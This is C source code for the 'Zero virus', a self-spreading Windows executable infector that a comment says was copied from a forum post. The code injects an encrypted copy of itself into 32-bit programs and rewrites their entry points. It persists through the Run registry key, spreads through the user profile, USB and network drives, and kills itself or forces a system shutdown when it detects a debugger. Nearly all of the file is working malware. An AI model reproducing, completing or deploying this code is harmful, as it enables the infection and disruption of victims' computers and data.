// code is copy paste from http://www.rohitab.com/discuss/topic/40857-my-first-pe-infection-virus-zero-virus/

#include <stdio.h>
#include <Windows.h>
#include <ImageHlp.h>
#include "ntdll.h"
 
#pragma comment(lib,"imagehlp.lib")
#pragma comment(lib,"ntdll.lib")
 
#pragma comment(linker,"/include:__tls_used")
#pragma section(".CRT$XLB",read)
 
#define Align(Value,Alignment) (((Value + Alignment-1)/Alignment)*Alignment)
#define VIRUS_KEY 0xF4
#define VIRUS_FLAG ((VIRUS_KEY^0x7FFFFFFF)^0xF0F0F0F0)
 
typedef DWORD (WINAPI *pExpandEnvironmentStringsA)(
    LPCSTR lpSrc,
    LPSTR lpDst,
    DWORD nSize
    );
 
typedef HANDLE (WINAPI *pCreateFileA)(
    LPCSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
    );
 
typedef BOOL (WINAPI *pWriteFile)(
    HANDLE hFile,
    LPCVOID lpBuffer,
    DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
    );
 
typedef LPVOID (WINAPI *pVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
    );
 
typedef BOOL (WINAPI *pCloseHandle)(HANDLE Handle);
 
typedef BOOL (WINAPI *pVirtualFree)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD dwFreeType
    );
 
typedef BOOL (WINAPI *pCreateProcessA)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );
 
typedef enum _HARDERROR_RESPONSE_OPTION
{
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
}HARDERROR_RESPONSE_OPTION;
 
typedef enum _HARDERROR_RESPONSE
{
    ResponseReturnToCaller,
    ResponseNotHandled,
    ResponseAbort,
    ResponseCancel,
    ResponseIgnore,
    ResponseNo,
    ResponseOk,
    ResponseRetry,
    ResponseYes,
    ResponseTryAgain,
    ResponseContinue
}HARDERROR_RESPONSE;
 
extern "C" NTSTATUS NTAPI NtRaiseHardError(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    ULONG ValidResponseOptions,
    PULONG Response
);
 
PVOID p_virus_file;
ULONG virus_size;
 
PIMAGE_SECTION_HEADER WINAPI AddSection(PVOID Image, const char* SectionName,ULONG SectionSize,ULONG Characteristics)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS p_image_nt_headers;
    PIMAGE_SECTION_HEADER p_image_section_header;
 
    ULONG i;

    p_image_dos_header = (PIMAGE_DOS_HEADER)Image;

    if(p_image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return NULL;
    }
 
    p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)Image + p_image_dos_header->e_lfanew);
 
    if(p_image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
    {
        return NULL;
    }
 
    p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers + 1);
    i = p_image_nt_headers->FileHeader.NumberOfSections;
 
    memset(&p_image_section_header[i], 0, sizeof(IMAGE_SECTION_HEADER));
 
    p_image_section_header[i].Characteristics = Characteristics;

    p_image_section_header[i].PointerToRawData = Align(
        p_image_section_header[i-1].PointerToRawData + p_image_section_header[i-1].SizeOfRawData,p_image_nt_headers->OptionalHeader.FileAlignment);

    p_image_section_header[i].VirtualAddress = Align(
        p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize,p_image_nt_headers->OptionalHeader.SectionAlignment);
    
    p_image_section_header[i].SizeOfRawData = Align(
        SectionSize,
        p_image_nt_headers->OptionalHeader.SectionAlignment);

    p_image_section_header[i].Misc.VirtualSize = SectionSize;
 
    memcpy(p_image_section_header[i].Name,SectionName,8);
 
    p_image_nt_headers->FileHeader.NumberOfSections++;
    p_image_nt_headers->OptionalHeader.SizeOfImage = p_image_section_header[i].VirtualAddress + p_image_section_header[i].Misc.VirtualSize;
 
    p_image_nt_headers->OptionalHeader.CheckSum = 0;
    return &p_image_section_header[i];
}

int WINAPI VirusCode()
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS p_image_nt_headers;
    PIMAGE_EXPORT_DIRECTORY p_image_export_directory;
 
    PPEB Peb;
    PLDR_DATA_TABLE_ENTRY Ldr;
 
    PVOID Buffer, Module, Kernel32Base;
    ULONG i, Hash, FileSize, EntryPointRva, VirusRva, write;
 
    PUCHAR EncryptedVirus,DecryptedVirus,ptr;
    PULONG Function,Name;
    PUSHORT Ordinal;
 
    FARPROC EntryPoint; // Original entry point
    HANDLE hFile;
 
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
 
    pExpandEnvironmentStringsA fnExpandEnvironmentStringsA;
    pCreateFileA fnCreateFileA;
    pWriteFile fnWriteFile;
    pVirtualAlloc fnVirtualAlloc;
    pCloseHandle fnCloseHandle;
    pVirtualFree fnVirtualFree;
    pCreateProcessA fnCreateProcessA;
 
    char FilePath[] = {'%','t','e','m','p','%','\\','Z','e','r','o','.','e','x','e',0},FileName[260];
 
    __asm
    {
        mov eax,0x41414141
        mov EntryPointRva,eax
 
        mov eax,0x42424242
        mov VirusRva,eax
 
        mov eax,0x43434343
        mov FileSize,eax
    }
 
    Peb = NtCurrentPeb(); // Get the PEB
    Ldr = CONTAINING_RECORD(Peb->Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Read the loader data
 
    Module = Ldr->DllBase; // Process executable
 
    Ldr  =  CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // ntdll (not used)
    Ldr  =  CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // kernel32
 
    Kernel32Base = Ldr->DllBase; // Store the address of kernel32
 
    p_image_dos_header = (PIMAGE_DOS_HEADER)Kernel32Base;
    p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)Kernel32Base + p_image_dos_header->e_lfanew);
 
    // Get the export directory of kernel32
 
    p_image_export_directory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)Kernel32Base + p_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
    Function = (PULONG)((PUCHAR)Kernel32Base + p_image_export_directory->AddressOfFunctions);
    Name = (PULONG)((PUCHAR)Kernel32Base + p_image_export_directory->AddressOfNames);
 
    Ordinal = (PUSHORT)((PUCHAR)Kernel32Base + p_image_export_directory->AddressOfNameOrdinals);
 
    // Loop over the function names
 
    for(i = 0;i < p_image_export_directory->NumberOfNames; i++)
    {
        PUCHAR ptr = (PUCHAR)Kernel32Base + Name[i]; // Pointer to function name
        ULONG Hash = 0;
 
        // Compute the hash
 
        while(*ptr)
        {
            Hash = ((Hash<<8) + Hash + *ptr)^(*ptr<<16);
            ptr++;
        }
 
        // Hash of ExpandEnvironmentStringsA
 
        if(Hash == 0x575d1e20)
        {
            fnExpandEnvironmentStringsA = (pExpandEnvironmentStringsA)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
        }
 
        // Hash of CreateFileA
 
        if(Hash == 0xd83eb415)
        {
            fnCreateFileA = (pCreateFileA)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
        }
 
        // Hash of WriteFile
 
        if(Hash == 0xa5e7378b)
        {
            fnWriteFile = (pWriteFile)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
        }
 
        // Hash of VirtualAlloc
 
        if(Hash == 0xa15d96d2)
        {
            fnVirtualAlloc = (pVirtualAlloc)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
        }
 
        // Hash of CloseHandle
 
        if(Hash == 0x7dfbd342)
        {
            fnCloseHandle = (pCloseHandle)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
        }
 
        // Hash of VirtualFree
 
        if(Hash == 0x6f043b69)
        {
            fnVirtualFree = (pVirtualFree)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
        }
 
        // Hash of CreateProcessA
 
        if(Hash == 0xae3b3c74)
        {
            fnCreateProcessA = (pCreateProcessA)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
        }
    }
 
    EncryptedVirus = (PUCHAR)Module + VirusRva; // Get the virus body
    Buffer = fnVirtualAlloc(NULL,FileSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE); // Allocate buffer
 
    if(Buffer)
    {
        DecryptedVirus = (PUCHAR)Buffer;
 
        // Decrypt the virus
 
        for(i = 0;i < FileSize;i++)
        {
            DecryptedVirus[i] = EncryptedVirus[i]^VIRUS_KEY;
        }
 
        fnExpandEnvironmentStringsA(FilePath,FileName,sizeof(FileName));
 
        // Drop the virus in temp folder
 
        hFile = fnCreateFileA(FileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
 
        if(hFile != INVALID_HANDLE_VALUE)
        {
            // Write the virus to file
 
            if(fnWriteFile(hFile,Buffer,FileSize,&write,NULL))
            {
                fnCloseHandle(hFile); // Close the file handle
                fnVirtualFree(Buffer,0,MEM_RELEASE); // Free the buffer
 
                ptr = (PUCHAR)&si;
 
                // Zero the structures
 
                for(i = 0;i<sizeof(si);i++)
                {
                    ptr[i] = 0;
                }
 
                ptr = (PUCHAR)&pi;
 
                for(i = 0;i<sizeof(pi);i++)
                {
                    ptr[i] = 0;
                }
 
                // Run the virus executable
 
                if(fnCreateProcessA(FileName,NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi))
                {
                    fnCloseHandle(pi.hThread);
                    fnCloseHandle(pi.hProcess);
                }
            }
        }
    }
 
    // Call the original entry point
 
    EntryPoint = (FARPROC)((PUCHAR)Module + EntryPointRva);
    return EntryPoint();
}
 
void WINAPI VirusEnd()
{
    return;
}
 
BOOL WINAPI IsValidExecutable(HANDLE hFile,PULONG SectionAlignment)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS p_image_nt_headers;
     
    PVOID Buffer;
    ULONG FileSize,read;
 
    FileSize = GetFileSize(hFile,NULL);
    Buffer = VirtualAlloc(NULL,FileSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
 
    if(!Buffer)
    {
        return FALSE;
    }
 
    if(!ReadFile(hFile,Buffer,FileSize,&read,NULL))
    {
        VirtualFree(Buffer,0,MEM_RELEASE);
        return FALSE;
    }
 
    __try
    {
        p_image_dos_header = (PIMAGE_DOS_HEADER)Buffer;
         
        if(p_image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
        {
            VirtualFree(Buffer,0,MEM_RELEASE);
            return FALSE;
        }
 
        p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)Buffer + p_image_dos_header->e_lfanew);
 
        if(p_image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
        {
            VirtualFree(Buffer,0,MEM_RELEASE);
            return FALSE;
        }
 
        // Make sure it is 32-bit program
 
        if(p_image_nt_headers->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
        {
            VirtualFree(Buffer,0,MEM_RELEASE);
            return FALSE;
        }
 
        if(p_image_nt_headers->FileHeader.Characteristics & IMAGE_FILE_DLL)
        {
            VirtualFree(Buffer,0,MEM_RELEASE);
            return FALSE;
        }
 
        if(p_image_nt_headers->OptionalHeader.LoaderFlags == VIRUS_FLAG)
        {
            VirtualFree(Buffer,0,MEM_RELEASE);
            return FALSE;
        }
 
        if(p_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress)
        {
            VirtualFree(Buffer,0,MEM_RELEASE);
            return FALSE;
        }
 
        if(p_image_nt_headers->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI || p_image_nt_headers->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_GUI)
        {
            if(SectionAlignment)
            {
                *SectionAlignment = p_image_nt_headers->OptionalHeader.SectionAlignment;
            }
             
            VirtualFree(Buffer,0,MEM_RELEASE);
            return TRUE;
        }
    }
 
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        VirtualFree(Buffer,0,MEM_RELEASE);
        return FALSE;
    }
 
    VirtualFree(Buffer,0,MEM_RELEASE);
    return FALSE;
}
 
void WINAPI InfectFile(PSTR FileName)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS p_image_nt_headers;
    PIMAGE_SECTION_HEADER p_image_section_header;
     
    HANDLE hFile,hMap;
    PVOID MappedFile;
    ULONG i,FileSize,SectionSize,CodeSize,SectionAlignment,AlignedSize,OldChecksum,NewChecksum;
 
    PUCHAR CodeAddress, VirusAddress, ptr;
 
    hFile = CreateFileA(FileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
 
    if(hFile != INVALID_HANDLE_VALUE)
    {
        if(!IsValidExecutable(hFile, &SectionAlignment))
        {
            NtClose(hFile);
            return;
        }
 
        CodeSize = (ULONG)VirusEnd-(ULONG)VirusCode;
        SectionSize  =  CodeSize + virus_size;

        FileSize = GetFileSize(hFile,NULL);
        AlignedSize = FileSize + Align(SectionSize, SectionAlignment); // File size need to be aligned. Otherwise the program will not run after infection.

        // Create a mapping of a file (original file does not change when we change content in 
        // the mapping file, to apply the change in mapped file to the original file, use 
        // FlushViewOfFile())
        hMap = CreateFileMapping(hFile,NULL,PAGE_READWRITE,0,AlignedSize,NULL);
 
        if(hMap)
        {
            MappedFile = MapViewOfFile(hMap,FILE_MAP_ALL_ACCESS,0,0,0);
 
            if(MappedFile)
            {
                PIMAGE_DOS_HEADER p_image_dos_header = (PIMAGE_DOS_HEADER)MappedFile;
                p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)MappedFile + p_image_dos_header->e_lfanew);

                // Add a new section to contain virus code and return IMAGE_SECTION_HEADER of that virus section
                p_image_section_header  =  AddSection(MappedFile , "Zero", SectionSize, IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE);
 
                if(p_image_section_header)
                {
                    
                    ptr = (PUCHAR)MappedFile + p_image_section_header->PointerToRawData; // Begin of virus section
 
                    CodeAddress = ptr;
                    VirusAddress = CodeAddress + CodeSize;
 
                    memcpy(CodeAddress,VirusCode,CodeSize); // Write the virus code to the file
                    memcpy(VirusAddress,p_virus_file,virus_size); // Write the virus body to the file
 
                    // Fill up placeholders
 
                    while(1)
                    {
                        if(*ptr == 0xb8 && *(PULONG)(ptr + 1) == 0x41414141)
                        {
                            *(PULONG)(ptr + 1) = p_image_nt_headers->OptionalHeader.AddressOfEntryPoint;
                            break;
                        }
 
                        ptr++;
                    }
 
                    ptr = (PUCHAR)MappedFile + p_image_section_header->PointerToRawData;
 
                    while(1)
                    {
                        if(*ptr == 0xb8 && *(PULONG)(ptr + 1) == 0x42424242)
                        {
                            *(PULONG)(ptr + 1) = (ULONG)VirusAddress-p_image_section_header->PointerToRawData + p_image_section_header->VirtualAddress-(ULONG)MappedFile;
                            break;
                        }
 
                        ptr++;
                    }
 
                    ptr = (PUCHAR)MappedFile + p_image_section_header->PointerToRawData;
 
                    while(1)
                    {
                        if(*ptr == 0xb8 && *(PULONG)(ptr + 1) == 0x43434343)
                        {
                            *(PULONG)(ptr + 1) = virus_size;
                            break;
                        }
 
                        ptr++;
                    }
 
                    // Encrypt the virus
 
                    for(i = 0;i<virus_size;i++)
                    {
                        VirusAddress[i] ^= VIRUS_KEY;
                    }
 
                    p_image_nt_headers->OptionalHeader.AddressOfEntryPoint = (ULONG)CodeAddress-p_image_section_header->PointerToRawData + p_image_section_header->VirtualAddress-(ULONG)MappedFile; // Set the entry point
                    p_image_nt_headers->OptionalHeader.LoaderFlags = VIRUS_FLAG; // Set the infection flag. Since Windows no longer use loader flag, we can use this to store our infection flag.
 
                    if(CheckSumMappedFile(MappedFile,AlignedSize,&OldChecksum,&NewChecksum))
                    {
                        p_image_nt_headers->OptionalHeader.CheckSum = NewChecksum; // Correct the checksum
                    }
 
                    FlushViewOfFile(MappedFile,0); // Flush the changes into file
                    UnmapViewOfFile(MappedFile); // Unmap the file
                }
            }
        }
    }
 
    NtClose(hMap);
    NtClose(hFile);
}

// Search all files in a path.
// If found a file -> infect it!
// If found a folder -> dive into that folder to find files
void WINAPI SearchFile(PSTR Directory)
{
    HANDLE hFind;
    WIN32_FIND_DATAA FindData;
 
    char SearchName[1024],FullPath[1024];
    LARGE_INTEGER delay;
 
    delay.QuadPart = (__int64)-10*10000;
 
    memset(SearchName,0,sizeof(SearchName));
    memset(&FindData,0,sizeof(WIN32_FIND_DATAA));
 
    sprintf(SearchName,"%s\\*",Directory);
 
    hFind  =  FindFirstFileA(SearchName, &FindData);
 
    if(hFind != INVALID_HANDLE_VALUE)
    {
        while(FindNextFileA(hFind, &FindData))
        {
            if(FindData.cFileName[0] == '.')
            {
                continue;
            }
             
            memset(FullPath,0,sizeof(FullPath));
            sprintf(FullPath,"%s\\%s",Directory,FindData.cFileName);
 
            if(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                SearchFile(FullPath);
            }
 
            else
            {
                InfectFile(FullPath);
            }
 
            NtDelayExecution(FALSE,&delay);
        }
 
        FindClose(hFind);
    }
}
 
void NTAPI TlsCallback(PVOID Module,ULONG Reason,PVOID Context)
{
    HKEY hKey;
    char ModulePath[1024],TempPath[60];
     
    PPEB Peb = NtCurrentPeb();
    ULONG_PTR DebugPort = 0;
 
    if(Reason != DLL_PROCESS_ATTACH)
    {
        return;
    }
     
    if(Peb->BeingDebugged)
    {
        NtTerminateProcess(NtCurrentProcess(),0);
        while(1);
    }
 
    if(NT_SUCCESS(NtQueryInformationProcess(NtCurrentProcess(),ProcessDebugPort,&DebugPort,sizeof(ULONG_PTR),NULL)))
    {
        if(DebugPort)
        {
            NtTerminateProcess(NtCurrentProcess(),0);
            while(1);
        }
    }
 
    GetModuleFileNameA(NULL,ModulePath,sizeof(ModulePath));
 
    ExpandEnvironmentStringsA("%temp%\\Zero.exe",TempPath,sizeof(TempPath));
    CopyFileA(ModulePath,TempPath,FALSE); // Copy the virus to temp folder
 
    // Add the virus to registry
 
    if(!RegCreateKeyA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey))
    {
        RegSetValueExA(hKey,"Zero",0,REG_SZ,(PUCHAR)TempPath,sizeof(TempPath));
        RegCloseKey(hKey);
    }
}
 
__declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK TlsCallbackAddress[] = {TlsCallback,NULL};

DWORD WINAPI AntiDebug(PVOID p)
{
    BOOLEAN bl;
    LARGE_INTEGER delay;
 
    ULONG Response;
    
    PPEB Peb  =  NtCurrentPeb();
    ULONG_PTR DebugPort = 0;
 
    delay.QuadPart = (__int64)-10*10000;
 
    while(1)
    {
        // Indicates whether the specified process is currently being debugged. The PEB 
        // structure, however, is an internal operating-system structure whose layout may 
        // change in the future. It is best to use the CheckRemoteDebuggerPresent function 
        // instead.
        if(Peb->BeingDebugged)
        {
            break;
        }

        /*
        __kernel_entry NTSTATUS NtQueryInformationProcess(
        [in]            HANDLE           ProcessHandle,
        [in]            PROCESSINFOCLASS ProcessInformationClass,
        [out]           PVOID            ProcessInformation,
        [in]            ULONG            ProcessInformationLength,
        [out, optional] PULONG           ReturnLength
        );
        */
        if(NT_SUCCESS(NtQueryInformationProcess(NtCurrentProcess(),ProcessDebugPort,&DebugPort,sizeof(ULONG_PTR),NULL)))
        {
            if(DebugPort  !=  0)
            {
                break;
            }
        }
 
        NtDelayExecution(FALSE,&delay);
    }
 
    RtlAdjustPrivilege(19,TRUE,FALSE,&bl); // SE_SHUTDOWN_PRIVILEGE 
    NtRaiseHardError(0xC000026A,0,0,NULL,OptionShutdownSystem,&Response);
 
    while(1);
}
 
DWORD WINAPI InfectUserProfile(PVOID p)
{
    char UserProfile[1024];
    LARGE_INTEGER delay;
 
    delay.QuadPart = (__int64)-600000*10000;
    GetEnvironmentVariableA("userprofile",UserProfile,sizeof(UserProfile)); // Get the path of user profile
     
    while(1)
    {
        SearchFile(UserProfile); // Search for files to infect
        NtDelayExecution(FALSE,&delay);
    }
}
 
DWORD WINAPI InfectDrives(PVOID p)
{
    ULONG DriveType;
    char drives[1024],*str;
 
    LARGE_INTEGER delay;
 
    delay.QuadPart = (__int64)-600000*10000;
 
    while(1)
    {
        memset(drives,0,sizeof(drives));
 
        GetLogicalDriveStringsA(sizeof(drives),drives); // Get all drives
        str = drives;
 
        while(*str)
        {
            DriveType = GetDriveTypeA(str); // Check the drive type
 
            // Infect removable and network drives
 
            if(DriveType == DRIVE_REMOVABLE || DriveType == DRIVE_REMOTE)
            {
                SearchFile(str); // Search for files to infect
            }
 
            str += strlen(str) + 1; // Get the next drive
        }
 
        NtDelayExecution(FALSE,&delay);
    }
}
 
int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow)
{
    HANDLE hFile;
    ULONG read,op;
 
    CreateMutexA(NULL,TRUE,"{755842AD-901B-482D-81B3-010C4EB22197}");
 
    if(GetLastError() == ERROR_ALREADY_EXISTS)
    {
        NtTerminateProcess(NtCurrentProcess(),0);
        while(1);
    }
    
    // Get handle of current exe file for reading information
    hFile  =  CreateFileA(_pgmptr,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
 
    if(hFile != INVALID_HANDLE_VALUE)
    {
        // Khởi tạo bộ nhớ cho virus file
        virus_size  =  GetFileSize(hFile,NULL);
        p_virus_file  =  VirtualAlloc(NULL , virus_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 
        if(p_virus_file)
        {
            if(!ReadFile(hFile,p_virus_file,virus_size,&read,NULL))
            {
                NtClose(hFile);
                return -1;
            }
        }
 
        NtClose(hFile);
        VirtualProtect(p_virus_file,virus_size,PAGE_READONLY,&op); // Protect the virus data
    }
 
    // Create worker threads

    CreateThread(NULL,0,AntiDebug,NULL,0,NULL);
    CreateThread(NULL,0,InfectUserProfile,NULL,0,NULL);
    CreateThread(NULL,0,InfectDrives,NULL,0,NULL);
 
    MessageBoxA(NULL,"You have been owned by Zero virus!","Zero virus by zwclose7",MB_ICONWARNING);
 
    NtTerminateThread(NtCurrentThread(),0); // Terminate the current thread
    while(1);
}
